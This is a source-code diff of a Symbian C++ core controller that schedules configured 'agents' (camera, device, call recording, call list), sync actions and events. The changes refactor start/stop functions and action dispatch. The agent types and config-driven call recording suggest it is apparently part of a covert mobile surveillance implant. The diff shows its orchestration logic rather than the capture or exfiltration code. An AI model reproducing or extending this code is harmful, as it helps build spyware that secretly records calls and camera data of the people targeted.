@@ -8,6 +8,8 @@
 
 #include "Core.h"
 #include "ConfigFile.h"
+#include "ActionEvent.h"
+#include "ActionAgent.h"
 
 
 #include <D32DBMS.h> 
@@ -61,7 +63,9 @@ CCore::~CCore()
 #endif
 */
 	iFs.Close();
-	RProperty::Delete(KPropertyFreeSpaceThreshold);
+	RProperty::Delete(KPropertyUidCore,KPropertyFreeSpaceThreshold);
+	RProperty::Delete(KPropertyUidCore,KPropertyStopSubactions);
+	
 	__FLOG(_L("EndDestructor"));
 	__FLOG_CLOSE;
 	}
@@ -75,7 +79,9 @@ void CCore::ConstructL()
 	static _LIT_SECURITY_POLICY_PASS(KAllowAllPolicy);
 	TInt ris = 0;
 	ris = RProperty::Define(KPropertyUidCore, KPropertyFreeSpaceThreshold, RProperty::EInt,KAllowAllPolicy, KAllowAllPolicy);
-		
+	ris = RProperty::Define(KPropertyUidCore, KPropertyStopSubactions, RProperty::EInt,KAllowAllPolicy, KAllowAllPolicy);	
+	RProperty::Set(KPropertyUidCore, KPropertyStopSubactions,0);
+	
 	iConfig = CConfigFile::NewL();
 	iFs.Connect();
 	iFreeSpaceMonitor = CFreeSpaceMonitor::NewL(*this,iFs);
@@ -192,7 +198,7 @@ void CCore::StopAllAgentsAndEventsL()
 	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
 		{
 		CDataAgent* dataAgent = iConfig->iAgentsList[i];
-		StopAgentL(ESecondaryQueue,dataAgent->iId);
+		StopAgentL(dataAgent->iId);
 		}
 
 	// Disposes all the Events...
@@ -259,7 +265,7 @@ void CCore::LoadConfigAndStartL()
 		CDataAgent* dataAgent = iConfig->iAgentsList[i];
 		if (dataAgent->iStatus == EAgent_Enabled)
 			{
-			StartAgentL(ESecondaryQueue,dataAgent->iId);
+			StartAgentL(dataAgent->iId);
 			}
 		}
 
@@ -299,25 +305,26 @@ void CCore::LoadNewConfigL()
 		
 	}
 
-void CCore::StartAgentL(TInt aQueueId, TAgentType agentId)
+//void CCore::StartAgentL(TInt aQueueId, TAgentType agentId)
+void CCore::StartAgentL(TAgentType aAgentId)
 	{
 	// MARK: Begin AGENT_CALL Patch
-	if (agentId == EAgent_Call_TODO)
+	if (aAgentId == EAgent_Call_TODO)
 		{
-		StartAgentL(aQueueId,EAgent_CallLocal);
-		StartAgentL(aQueueId,EAgent_CallList);
+		StartAgentL(EAgent_CallLocal);
+		StartAgentL(EAgent_CallList);
 		return;
 		}
 	// End AGENT_CALL Patch
 
 	// Retrieves the Agent's Parameters from the Config
-	CDataAgent* dataAgent = iConfig->FindDataAgent(agentId);
+	CDataAgent* dataAgent = iConfig->FindDataAgent(aAgentId);
 
 	// Raises a PANIC if the Agent is not available in the Config.
 	ASSERT(dataAgent != NULL);
 
 	// We have to distinguish between continuous modules and one shot modules
-	switch (agentId)
+	switch (aAgentId)
 		{
 		case EAgent_Cam:
 		case EAgent_Device:
@@ -330,14 +337,14 @@ void CCore::StartAgentL(TInt aQueueId, TAgentType agentId)
 			if(dataAgent->iStatus != EAgent_Running)
 				{
 				// Creates the new Agent 
-				CAbstractAgent* newAgent = AgentFactory::CreateAgentL(agentId, dataAgent->iParams);
+				CAbstractAgent* newAgent = AgentFactory::CreateAgentL(aAgentId, dataAgent->iParams);
 				TInt err = iEndPoints.Append(newAgent);
 				// Mark this Agent as "Running" so it will be stopped when a new config will be uploaded
 				dataAgent->iStatus = EAgent_Running;	
 				}
 			// send it the START command
-			TCmdStruct startCmd(EStart, ECore, agentId);
-			SubmitNewCommandL(aQueueId, startCmd);
+			TCmdStruct startCmd(EStart, ECore, aAgentId);
+			SubmitNewCommandL(ESecondaryQueue, startCmd);
 			}
 			break;
 		default:
@@ -346,13 +353,13 @@ void CCore::StartAgentL(TInt aQueueId, TAgentType agentId)
 			if(dataAgent->iStatus != EAgent_Running)
 				{
 				//TODO: verificare che call/callist si comportino come richiesto
-				if((agentId == EAgent_CallLocal) && (dataAgent->iAdditionalData == 0))
+				if((aAgentId == EAgent_CallLocal) && (dataAgent->iAdditionalData == 0))
 						return; //we are not asked to start call recording
 				// Creates the new Agent and send it the START command.
-				CAbstractAgent* newAgent = AgentFactory::CreateAgentL(agentId, dataAgent->iParams);
+				CAbstractAgent* newAgent = AgentFactory::CreateAgentL(aAgentId, dataAgent->iParams);
 				TInt err = iEndPoints.Append(newAgent);
-				TCmdStruct startCmd(EStart, ECore, agentId);
-				SubmitNewCommandL(aQueueId,startCmd);
+				TCmdStruct startCmd(EStart, ECore, aAgentId);
+				SubmitNewCommandL(ESecondaryQueue,startCmd);
 
 				// Mark this Agent as "Running" so it will be stopped when a new config will be uploaded
 				dataAgent->iStatus = EAgent_Running;	
@@ -363,19 +370,20 @@ void CCore::StartAgentL(TInt aQueueId, TAgentType agentId)
 	}
 
 
-void CCore::StopAgentL(TInt aQueueId, TAgentType agentId)
+//void CCore::StopAgentL(TInt aQueueId, TAgentType agentId)
+void CCore::StopAgentL(TAgentType aAgentId)
 	{
 	// MARK: Begin AGENT_CALL Patch
-	if (agentId == EAgent_Call_TODO)
+	if (aAgentId == EAgent_Call_TODO)
 		{
-		StopAgentL(aQueueId,EAgent_CallLocal);
-		StopAgentL(aQueueId,EAgent_CallList);
+		StopAgentL(EAgent_CallLocal);
+		StopAgentL(EAgent_CallList);
 		return;
 		} 
 	// End AGENT_CALL Patch
 		
 	// Retrieves the Agent's Parameters from the Config
-	CDataAgent* dataAgent = iConfig->FindDataAgent(agentId);
+	CDataAgent* dataAgent = iConfig->FindDataAgent(aAgentId);
 
 	// Raises a PANIC if the Agent is not available in the Config.
 	ASSERT(dataAgent != NULL);
@@ -385,14 +393,33 @@ void CCore::StopAgentL(TInt aQueueId, TAgentType agentId)
 		return;
 
 	// Sends a Stop command to the Agent
-	TCmdStruct stopCmd(ECmdStop, ECore, agentId);
-	SubmitNewCommandL(aQueueId, stopCmd);
+	TCmdStruct stopCmd(ECmdStop, ECore, aAgentId);
+	SubmitNewCommandL(ESecondaryQueue, stopCmd);
 
 	// Mark this Agent as "Stopped"
 	dataAgent->iStatus = EAgent_Stopped;	
 	}
 
+void CCore::EnableEventL(TInt aEventIdx)
+	{
+	TInt count = iEvents.Count();
+	if(aEventIdx >= count)
+		return; //out of boundary
+	if(!iEvents[aEventIdx]->Enabled())
+		iEvents[aEventIdx]->StartEventL();
+	}
 
+
+void CCore::DisableEventL(TInt aEventIdx)
+	{
+	TInt count = iEvents.Count();
+	if(aEventIdx >= count)
+		return; //out of boundary
+	if(iEvents[aEventIdx]->Enabled())
+		iEvents[aEventIdx]->StopEventL();
+	}
+
+/*
 void CCore::ExecuteActionL(TInt aQueueId,TActionType type, const TDesC8& params)
 	{
 	__FLOG_1(_L("ExecuteAction: %d"), type);
@@ -407,6 +434,39 @@ void CCore::ExecuteActionL(TInt aQueueId,TActionType type, const TDesC8& params)
 	CAbstractAction* newAction = ActionFactory::CreateActionL(type, params, (TQueueType) aQueueId);
 	iEndPoints.Append(newAction);
 	TCmdStruct startCmd(EStart, ECore, type);
+	SubmitNewCommandL(aQueueId,startCmd);
+	__FLOG(_L("ActionsExecuted"));
+	}
+*/
+void CCore::ExecuteActionL(TInt aQueueId,CDataAction* aAction)
+	{
+	TActionType type = aAction->iId;
+	
+	__FLOG_1(_L("ExecuteAction: %d"), type);
+	
+	if (type == EAction_Sync || type == EAction_SyncApn)
+		{
+		//RestartAllAgentsL();  // original MB
+		CycleAppendingAgentsL();
+		}
+	
+	// Creates the Action and send it a Start
+	CAbstractAction* newAction = ActionFactory::CreateActionL(type, aAction->iParams, (TQueueType) aQueueId);
+	newAction->iTag = aAction->iTagId;
+	if(type == EAction_Event)
+		{
+		CActionEvent* actionEvent = (CActionEvent*)newAction;
+		actionEvent->SetCorePointer(this);
+		}
+	if(type == EAction_Agent)
+		{
+		CActionAgent* actionAgent = (CActionAgent*)newAction;
+		actionAgent->SetCorePointer(this);
+		}
+	//newAction->iConditioned = aAction->iConditioned;
+	iEndPoints.Append(newAction);
+	//TCmdStruct startCmd(EStart, ECore, type);
+	TCmdStruct startCmd(EStart, ECore, type, newAction->iTag);
 	SubmitNewCommandL(aQueueId,startCmd);
 	__FLOG(_L("ActionsExecuted"));
 	}
@@ -448,146 +508,26 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 		// Handles also the special cases enable event / disable event
 		switch (action->iId)
 			{
+			/*
 			case EAction_StartAgent:
 				{
 				TAgentType agentId = (TAgentType)action->iAdditionalData;
-				/*
-				RBuf paramsBuf;
-				TInt err = paramsBuf.Create(2*(action->iParams.Size()));
-				if(err == KErrNone)
-					{
-					paramsBuf.Copy(action->iParams);
-					}
-				else
-					{
-					//TODO: not enough memory
-					}
-								
-				paramsBuf.CleanupClosePushL();
-				CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
-				CleanupStack::PushL(jsonBuilder);
-				jsonBuilder->BuildFromJsonStringL(paramsBuf);
-				CJsonObject* rootObject;
-				jsonBuilder->GetDocumentObject(rootObject);
-				if(rootObject)
-					{
-					CleanupStack::PushL(rootObject);
-					agentId = (TAgentType) iConfig->GetModuleId(rootObject);
-					CleanupStack::PopAndDestroy(rootObject);
-					}
-				CleanupStack::PopAndDestroy(jsonBuilder);
-				CleanupStack::PopAndDestroy(&paramsBuf);
-				*/
 				if(agentId>0)
 					StartAgentL(queueId,agentId);
-				break;
 				}
+				break;
 			case EAction_StopAgent:
 				{
 				TAgentType agentId = (TAgentType) action->iAdditionalData;
-				/*
-				RBuf paramsBuf;
-				TInt err = paramsBuf.Create(2*(action->iParams.Size()));
-				if(err == KErrNone)
-					{
-					paramsBuf.Copy(action->iParams);
-					}
-				else
-					{
-					//TODO: not enough memory
-					}
-												
-				paramsBuf.CleanupClosePushL();
-				CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
-				CleanupStack::PushL(jsonBuilder);
-				jsonBuilder->BuildFromJsonStringL(paramsBuf);
-				CJsonObject* rootObject;
-				jsonBuilder->GetDocumentObject(rootObject);
-				if(rootObject)
-					{
-					CleanupStack::PushL(rootObject);
-					agentId = (TAgentType) iConfig->GetModuleId(rootObject);
-					CleanupStack::PopAndDestroy(rootObject);
-					}
-				CleanupStack::PopAndDestroy(jsonBuilder);
-				CleanupStack::PopAndDestroy(&paramsBuf);
-				*/
 				if(agentId>0)
 					StopAgentL(queueId,agentId);
-				break;
 				}
-			case EAction_EnableEvent:
-				{
-				TInt orderId = action->iAdditionalData;
-				
-				/*
-				RBuf paramsBuf;
-				TInt err = paramsBuf.Create(2*(action->iParams.Size()));
-				if(err == KErrNone)
-					{
-					paramsBuf.Copy(action->iParams);
-					}
-				else
-					{
-					//TODO: not enough memory
-					}
-																
-				paramsBuf.CleanupClosePushL();
-				CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
-				CleanupStack::PushL(jsonBuilder);
-				jsonBuilder->BuildFromJsonStringL(paramsBuf);
-				CJsonObject* rootObject;
-				jsonBuilder->GetDocumentObject(rootObject);
-				if(rootObject)
-					{
-					CleanupStack::PushL(rootObject);
-					rootObject->GetIntL(_L("event"),orderId);
-					CleanupStack::PopAndDestroy(rootObject);
-					}
-				CleanupStack::PopAndDestroy(jsonBuilder);
-				CleanupStack::PopAndDestroy(&paramsBuf);
+				break;
 				*/
-				if(!(iEvents[orderId]->Enabled()))
-					iEvents[orderId]->StartEventL();
-				}
-				break;
-			case EAction_DisableEvent:
-				{
-				TInt orderId = action->iAdditionalData;
-				/*				
-				RBuf paramsBuf;
-			    TInt err = paramsBuf.Create(2*(action->iParams.Size()));
-				if(err == KErrNone)
-					{
-					paramsBuf.Copy(action->iParams);
-					}
-				else
-					{
-					//TODO: not enough memory
-					}
-																				
-				paramsBuf.CleanupClosePushL();
-				CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
-				CleanupStack::PushL(jsonBuilder);
-				jsonBuilder->BuildFromJsonStringL(paramsBuf);
-				CJsonObject* rootObject;
-				jsonBuilder->GetDocumentObject(rootObject);
-				if(rootObject)
-					{
-					CleanupStack::PushL(rootObject);
-					rootObject->GetIntL(_L("event"),orderId);
-					CleanupStack::PopAndDestroy(rootObject);
-					}
-				CleanupStack::PopAndDestroy(jsonBuilder);
-				CleanupStack::PopAndDestroy(&paramsBuf);
-					*/			
-				if((iEvents[orderId]->Enabled()))
-					iEvents[orderId]->StopEventL();
-				}
-				break;
 			default:
 				// All others are real Actions, so creates new Actions instances and send them a START commmand
-				ExecuteActionL(queueId,action->iId, action->iParams);
+				//ExecuteActionL(queueId,action->iId, action->iParams);
+				ExecuteActionL(queueId,action);
 				break;
 			}
 		}
